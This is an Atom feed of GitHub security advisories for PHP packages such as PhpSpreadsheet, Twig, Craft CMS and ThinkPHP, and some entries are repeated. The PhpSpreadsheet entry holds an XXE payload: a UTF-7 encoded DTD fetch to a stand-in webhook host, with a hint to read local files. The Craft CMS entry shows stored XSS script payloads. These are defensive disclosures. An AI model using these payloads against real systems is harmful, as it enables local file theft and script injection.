<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-09-16T09:01:21.184Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ec-cube/ec-cube] EC-CUBE Open redirect vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fcgg-qgxg-2g2x</id>
        <link href="https://github.com/advisories/GHSA-fcgg-qgxg-2g2x"/>
        <updated>2024-09-13T19:33:38.000Z</updated>
        <content type="html"><![CDATA[<p>Open redirect vulnerability in EC-CUBE (EC-CUBE 3.0.0, EC-CUBE 3.0.1, EC-CUBE 3.0.2, EC-CUBE 3.0.3, EC-CUBE 3.0.4, EC-CUBE 3.0.5, EC-CUBE 3.0.6, EC-CUBE 3.0.7, EC-CUBE 3.0.8, EC-CUBE 3.0.9, EC-CUBE 3.0.10, EC-CUBE 3.0.11, EC-CUBE 3.0.12, EC-CUBE 3.0.12-p1, EC-CUBE 3.0.13, EC-CUBE 3.0.14, EC-CUBE 3.0.15, EC-CUBE 3.0.16) allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16191">https://nvd.nist.gov/vuln/detail/CVE-2018-16191</a></li>
<li><a href="https://jvn.jp/en/jp/JVN25359688/index.html">https://jvn.jp/en/jp/JVN25359688/index.html</a></li>
<li><a href="http://www.securityfocus.com/bid/106545">http://www.securityfocus.com/bid/106545</a></li>
<li><a href="https://www.ec-cube.net/info/weakness/20181113">https://www.ec-cube.net/info/weakness/20181113</a></li>
<li><a href="https://github.com/advisories/GHSA-fcgg-qgxg-2g2x">https://github.com/advisories/GHSA-fcgg-qgxg-2g2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcgg-qgxg-2g2x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:36:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet encoding is returned]]></title>
        <id>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</id>
        <link href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7"/>
        <updated>2024-09-13T13:37:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) </p>
<h3 id="details">Details</h3>
<p>Check <code> $pattern = '/encoding="(.*?)"/';</code> easy to bypass. Just use a single quote symbol <code>'</code>. So payload looks like this:</p>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://example.com/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<p>If you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. </p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create simple xlsx file</li>
<li>Rename xlsx to zip</li>
<li>Go to the zip and open the <code>xl/sharedStrings.xml</code> file in edit mode.</li>
<li>Replace <code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</code> to</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://%webhook%/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<ol start="5">
<li>Save <code>sharedStrings.xml</code> file and rename zip back to xlsx.</li>
<li>Use minimal php code that simply opens this xlsx file:</li>
</ol>
<pre><code>use PhpOffice\PhpSpreadsheet\IOFactory;
require __DIR__ . '/vendor/autoload.php';
$spreadsheet = IOFactory::load("file.xlsx");
</code></pre>
<ol start="7">
<li>You will receive the request to your <code>http://%webhook%/file.dtd</code></li>
<li>Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Read local files
<img alt="lfi" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45048">https://nvd.nist.gov/vuln/detail/CVE-2024-45048</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda">https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-29T17:58:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet encoding is returned]]></title>
        <id>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</id>
        <link href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7"/>
        <updated>2024-09-13T13:37:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) </p>
<h3 id="details">Details</h3>
<p>Check <code> $pattern = '/encoding="(.*?)"/';</code> easy to bypass. Just use a single quote symbol <code>'</code>. So payload looks like this:</p>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://example.com/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<p>If you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. </p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create simple xlsx file</li>
<li>Rename xlsx to zip</li>
<li>Go to the zip and open the <code>xl/sharedStrings.xml</code> file in edit mode.</li>
<li>Replace <code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</code> to</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding='UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://%webhook%/file.dtd"&gt; %xxe;]&gt;
</code></pre>
<ol start="5">
<li>Save <code>sharedStrings.xml</code> file and rename zip back to xlsx.</li>
<li>Use minimal php code that simply opens this xlsx file:</li>
</ol>
<pre><code>use PhpOffice\PhpSpreadsheet\IOFactory;
require __DIR__ . '/vendor/autoload.php';
$spreadsheet = IOFactory::load("file.xlsx");
</code></pre>
<ol start="7">
<li>You will receive the request to your <code>http://%webhook%/file.dtd</code></li>
<li>Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Read local files
<img alt="lfi" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45048">https://nvd.nist.gov/vuln/detail/CVE-2024-45048</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda">https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda</a></li>
<li><a href="https://github.com/advisories/GHSA-ghg6-32f9-2jp7">https://github.com/advisories/GHSA-ghg6-32f9-2jp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghg6-32f9-2jp7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-29T17:58:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twig/twig] Twig has a possible sandbox bypass]]></title>
        <id>https://github.com/advisories/GHSA-6j75-5wfj-gh66</id>
        <link href="https://github.com/advisories/GHSA-6j75-5wfj-gh66"/>
        <updated>2024-09-10T17:12:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under some circumstances, the sandbox security checks are not run which allows user-contributed templates to bypass the sandbox restrictions.</p>
<p>The security issue happens when all these conditions are met:</p>
<ul>
<li>The sandbox is disabled globally;</li>
<li>The sandbox is enabled via a sandboxed <code>include()</code> function which references a template name (like <code>included.twig</code>) and not a <code>Template</code> or <code>TemplateWrapper</code> instance;</li>
<li>The included template has been loaded before the <code>include()</code> call but in a non-sandbox context (possible as the sandbox has been globally disabled).</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The patch ensures that the sandbox security checks are always run at runtime.</p>
<h3 id="credits">Credits</h3>
<p>We would like to thank Fabien Potencier for reporting and fixing the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66">https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6">https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de">https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233">https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45411">https://nvd.nist.gov/vuln/detail/CVE-2024-45411</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635">https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635</a></li>
<li><a href="https://github.com/advisories/GHSA-6j75-5wfj-gh66">https://github.com/advisories/GHSA-6j75-5wfj-gh66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j75-5wfj-gh66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twig/twig] Twig has a possible sandbox bypass]]></title>
        <id>https://github.com/advisories/GHSA-6j75-5wfj-gh66</id>
        <link href="https://github.com/advisories/GHSA-6j75-5wfj-gh66"/>
        <updated>2024-09-10T17:12:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under some circumstances, the sandbox security checks are not run which allows user-contributed templates to bypass the sandbox restrictions.</p>
<p>The security issue happens when all these conditions are met:</p>
<ul>
<li>The sandbox is disabled globally;</li>
<li>The sandbox is enabled via a sandboxed <code>include()</code> function which references a template name (like <code>included.twig</code>) and not a <code>Template</code> or <code>TemplateWrapper</code> instance;</li>
<li>The included template has been loaded before the <code>include()</code> call but in a non-sandbox context (possible as the sandbox has been globally disabled).</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The patch ensures that the sandbox security checks are always run at runtime.</p>
<h3 id="credits">Credits</h3>
<p>We would like to thank Fabien Potencier for reporting and fixing the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66">https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6">https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de">https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233">https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45411">https://nvd.nist.gov/vuln/detail/CVE-2024-45411</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635">https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635</a></li>
<li><a href="https://github.com/advisories/GHSA-6j75-5wfj-gh66">https://github.com/advisories/GHSA-6j75-5wfj-gh66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j75-5wfj-gh66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[damienharper/auditor-bundle] auditor-bundle vulnerable to Cross-site Scripting because name of entity does not get escaped]]></title>
        <id>https://github.com/advisories/GHSA-78vg-7v27-hj67</id>
        <link href="https://github.com/advisories/GHSA-78vg-7v27-hj67"/>
        <updated>2024-09-10T19:01:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Unescaped entity property enables Javascript injection.</p>
<h3 id="details">Details</h3>
<p>I think this is possible because %source_label% in twig macro is not escaped. Therefore script tags can be inserted and are executed.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>clone example project <a href="https://github.com/DamienHarper/auditor-bundle-demo">https://github.com/DamienHarper/auditor-bundle-demo</a></li>
<li>create author with FullName </li>
<li>delete author</li>
<li>view audit of authors</li>
<li>alert is displayed</li>
</ul>
<h3 id="impact">Impact</h3>
<p>persistent XSS. JS can be injected and executed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DamienHarper/auditor-bundle/security/advisories/GHSA-78vg-7v27-hj67">https://github.com/DamienHarper/auditor-bundle/security/advisories/GHSA-78vg-7v27-hj67</a></li>
<li><a href="https://github.com/DamienHarper/auditor-bundle/commit/42ba2940d8b99467de0c806ea5655cc1c6882cd1">https://github.com/DamienHarper/auditor-bundle/commit/42ba2940d8b99467de0c806ea5655cc1c6882cd1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45592">https://nvd.nist.gov/vuln/detail/CVE-2024-45592</a></li>
<li><a href="https://github.com/advisories/GHSA-78vg-7v27-hj67">https://github.com/advisories/GHSA-78vg-7v27-hj67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78vg-7v27-hj67</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-10T15:53:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[topthink/framework] ThinkPHP deserialization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f4wh-359g-4pq7</id>
        <link href="https://github.com/advisories/GHSA-f4wh-359g-4pq7"/>
        <updated>2024-09-09T22:33:12.000Z</updated>
        <content type="html"><![CDATA[<p>A deserialization vulnerability in Thinkphp v6.1.3 to v8.0.4 allows attackers to execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-44902">https://nvd.nist.gov/vuln/detail/CVE-2024-44902</a></li>
<li><a href="https://github.com/fru1ts/CVE-2024-44902">https://github.com/fru1ts/CVE-2024-44902</a></li>
<li><a href="http://thinkphp.com">http://thinkphp.com</a></li>
<li><a href="https://github.com/advisories/GHSA-f4wh-359g-4pq7">https://github.com/advisories/GHSA-f4wh-359g-4pq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4wh-359g-4pq7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-09T21:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twig/twig] Twig has a possible sandbox bypass]]></title>
        <id>https://github.com/advisories/GHSA-6j75-5wfj-gh66</id>
        <link href="https://github.com/advisories/GHSA-6j75-5wfj-gh66"/>
        <updated>2024-09-10T17:12:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under some circumstances, the sandbox security checks are not run which allows user-contributed templates to bypass the sandbox restrictions.</p>
<p>The security issue happens when all these conditions are met:</p>
<ul>
<li>The sandbox is disabled globally;</li>
<li>The sandbox is enabled via a sandboxed <code>include()</code> function which references a template name (like <code>included.twig</code>) and not a <code>Template</code> or <code>TemplateWrapper</code> instance;</li>
<li>The included template has been loaded before the <code>include()</code> call but in a non-sandbox context (possible as the sandbox has been globally disabled).</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The patch ensures that the sandbox security checks are always run at runtime.</p>
<h3 id="credits">Credits</h3>
<p>We would like to thank Fabien Potencier for reporting and fixing the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66">https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6">https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de">https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233">https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45411">https://nvd.nist.gov/vuln/detail/CVE-2024-45411</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635">https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635</a></li>
<li><a href="https://github.com/advisories/GHSA-6j75-5wfj-gh66">https://github.com/advisories/GHSA-6j75-5wfj-gh66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j75-5wfj-gh66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[twig/twig] Twig has a possible sandbox bypass]]></title>
        <id>https://github.com/advisories/GHSA-6j75-5wfj-gh66</id>
        <link href="https://github.com/advisories/GHSA-6j75-5wfj-gh66"/>
        <updated>2024-09-10T17:12:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under some circumstances, the sandbox security checks are not run which allows user-contributed templates to bypass the sandbox restrictions.</p>
<p>The security issue happens when all these conditions are met:</p>
<ul>
<li>The sandbox is disabled globally;</li>
<li>The sandbox is enabled via a sandboxed <code>include()</code> function which references a template name (like <code>included.twig</code>) and not a <code>Template</code> or <code>TemplateWrapper</code> instance;</li>
<li>The included template has been loaded before the <code>include()</code> call but in a non-sandbox context (possible as the sandbox has been globally disabled).</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The patch ensures that the sandbox security checks are always run at runtime.</p>
<h3 id="credits">Credits</h3>
<p>We would like to thank Fabien Potencier for reporting and fixing the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66">https://github.com/twigphp/Twig/security/advisories/GHSA-6j75-5wfj-gh66</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6">https://github.com/twigphp/Twig/commit/11f68e2aeb526bfaf638e30d4420d8a710f3f7c6</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de">https://github.com/twigphp/Twig/commit/2102dd135986db79192d26fb5f5817a566e0a7de</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233">https://github.com/twigphp/Twig/commit/7afa198603de49d147e90d18062e7b9addcf5233</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45411">https://nvd.nist.gov/vuln/detail/CVE-2024-45411</a></li>
<li><a href="https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635">https://github.com/twigphp/Twig/commit/41103dcdc2daab4c83cdd05b5b4fde5b7e41e635</a></li>
<li><a href="https://github.com/advisories/GHSA-6j75-5wfj-gh66">https://github.com/advisories/GHSA-6j75-5wfj-gh66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j75-5wfj-gh66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to stored XSS in breadcrumb list and title fields]]></title>
        <id>https://github.com/advisories/GHSA-28h4-788g-rh42</id>
        <link href="https://github.com/advisories/GHSA-28h4-788g-rh42"/>
        <updated>2024-09-09T19:30:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Multiple Stored XSS can be triggered by the breadcrumb list and title fields with user input.</p>
<h3 id="details">Details</h3>
<ol>
<li>In the <strong>/admin/categories</strong> page, category title isn't sanitized and triggered xss.</li>
<li>In the category edit page under the <strong>/admin/categories/</strong>, category title in breadcrumb list isn't sanitized and triggered xss.</li>
<li>In the <strong>/admin/entries</strong> page, entry title isn't sanitized and triggered xss.</li>
<li>In the entry edit page under the <strong>/admin/entries/</strong>, entry title in breadcrumb list isn't sanitized and triggered xss.</li>
<li>In the <strong>/admin/myaccount</strong> and pages under it, username or full name in breadcrumb list isn't sanitized and triggered xss.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Malicious users can tamper with the control panel.</p>
<h3 id="poc">PoC</h3>
<h4 id="1-in-the-admincategories-page-category-title-isnt-sanitized-and-triggered-xss">1. In the <strong>/admin/categories</strong> page, category title isn't sanitized and triggered xss.</h4>
<pre><code>1. Access to the Settings -&gt; Categories ( /admin/settings/categories )
2. Create new category group
3. Access to the Categories page ( /admin/categories/ )
4. Push the New category button
5. Input the Title column : xss&lt;script&gt;alert('xss')&lt;/script&gt;
6. Push the Create Category or Save button
7. Access to the Categories page again and it triggers xss
</code></pre>
<p><img alt="image" src="https://github.com/craftcms/cms/assets/83068208/a1b2890e-731b-4fc4-b189-26591f4486fd">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/4e0f35c7-fbb0-4d38-a0b5-9e28750ff706">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/e046b9db-d83c-4f81-ad91-165c5afedeb9"></p>
<h4 id="2-in-the-category-edit-page-under-the-admincategories-category-title-in-breadcrumb-list-isnt-sanitized-and-triggered-xss">2. In the category edit page under the <strong>/admin/categories/</strong>, category title in breadcrumb list isn't sanitized and triggered xss.</h4>
<pre><code>1. Access to the Settings -&gt; Categories ( /admin/settings/categories )
2. Create new category group
3. Access to the Categories page ( /admin/categories/ )
4. Push the New category button
5. Input the Title column : xss&lt;script&gt;alert('xss')&lt;/script&gt;
6. Push the Create Category or Save button
7. Access to the Category edit page again and it triggers xss
</code></pre>
<p><img alt="image" src="https://github.com/craftcms/cms/assets/83068208/a1b2890e-731b-4fc4-b189-26591f4486fd">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/f7543a11-58eb-4099-9ee2-3461816c52ea">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/f01bbb80-4417-42ca-bf51-b38860f6c74a"></p>
<h4 id="3-in-the-adminentries-page-entry-title-isnt-sanitized-and-triggered-xss">3. In the <strong>/admin/entries</strong> page, entry title isn't sanitized and triggered xss.</h4>
<pre><code>1. Access to the Settings -&gt; Entry Types ( /admin/settings/entry-types )
2. Create new entry type
3. Access to the Settings -&gt; Sections ( /admin/settings/sections )
4. Create new section
5. Access to the Entries page ( /admin/entries )
6. Push the New entry button
7. Input the Title column : xss&lt;script&gt;alert('xss')&lt;/script&gt;
8. Push the Create entry or Save button
9. Access to the Entries page again and it triggers xss
</code></pre>
<p><img alt="image" src="https://github.com/craftcms/cms/assets/83068208/ba700899-947f-4421-a1b7-3f0cc2c0da30">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/b255a999-e48c-46be-b732-4482ea9cee9a">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/445d8e0c-71b6-49c7-8f4a-37541dcc9c85"></p>
<h4 id="4-in-the-entry-edit-page-under-the-adminentries-entry-title-in-breadcrumb-list-isnt-sanitized-and-triggered-xss">4. In the entry edit page under the <strong>/admin/entries/</strong>, entry title in breadcrumb list isn't sanitized and triggered xss.</h4>
<pre><code>1. Access to the Settings -&gt; Entry Types ( /admin/settings/entry-types )
2. Create new entry type
3. Access to the Settings -&gt; Sections ( /admin/settings/sections )
4. Create new section
5. Access to the Entries page ( /admin/entries )
6. Push the New entry button
7. Input the Title column : xss&lt;script&gt;alert('xss')&lt;/script&gt;
8. Push the Create entry or Save button
9. Access to the Entriy edit page again and it triggers xss
</code></pre>
<p><img alt="image" src="https://github.com/craftcms/cms/assets/83068208/ba700899-947f-4421-a1b7-3f0cc2c0da30">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/a59a122b-b9e7-4695-be13-eb8a1c2d36df">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/b0d27446-7ac6-47e7-ac02-20c924698b13"></p>
<h4 id="5-in-the-adminmyaccount-and-pages-under-it-username-or-full-name-in-breadcrumb-list-isnt-sanitized-and-triggered-xss">5. In the <strong>/admin/myaccount</strong> and pages under it, username or full name in breadcrumb list isn't sanitized and triggered xss.</h4>
<pre><code>1. Access to the My Account Page ( /admin/myaccount )
2. Input the Full Name column : xss&lt;script&gt;alert('xss')&lt;/script&gt;
3. Push the the Save button
4. Access to the My Account page ( /admin/myaccount ) or pages under it ( /admin/myaccount/addresses , /admin/myaccount/preferences , etc.) and it triggers xss
</code></pre>
<p><img alt="image" src="https://github.com/craftcms/cms/assets/83068208/3be45bdd-0757-42a8-bc5d-320ab2339fd0">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/e1be7446-1c54-42bc-af9a-a8ac81a2d7bf">
<img alt="image" src="https://github.com/craftcms/cms/assets/83068208/5fa06b26-fecd-40f5-bc8b-171f881f8a2a"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-28h4-788g-rh42">https://github.com/craftcms/cms/security/advisories/GHSA-28h4-788g-rh42</a></li>
<li><a href="https://github.com/craftcms/cms/commit/b7348942f8131b3868ec6f46d615baae50151bb8">https://github.com/craftcms/cms/commit/b7348942f8131b3868ec6f46d615baae50151bb8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45406">https://nvd.nist.gov/vuln/detail/CVE-2024-45406</a></li>
<li><a href="https://github.com/advisories/GHSA-28h4-788g-rh42">https://github.com/advisories/GHSA-28h4-788g-rh42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-28h4-788g-rh42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-09T18:18:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nategood/httpful] Httpful is Missing Certificate Validation]]></title>
        <id>https://github.com/advisories/GHSA-gcfg-hmwx-wq5h</id>
        <link href="https://github.com/advisories/GHSA-gcfg-hmwx-wq5h"/>
        <updated>2024-09-09T18:18:15.000Z</updated>
        <content type="html"><![CDATA[<p>Httpful has Insecure HTTPS Connections due to Missing Default Certificate Validation</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nategood/httpful/issues/247">https://github.com/nategood/httpful/issues/247</a></li>
<li><a href="https://github.com/nategood/httpful/commit/44c880e4f559e9215dc6ea9fe50315500c6c2c84">https://github.com/nategood/httpful/commit/44c880e4f559e9215dc6ea9fe50315500c6c2c84</a></li>
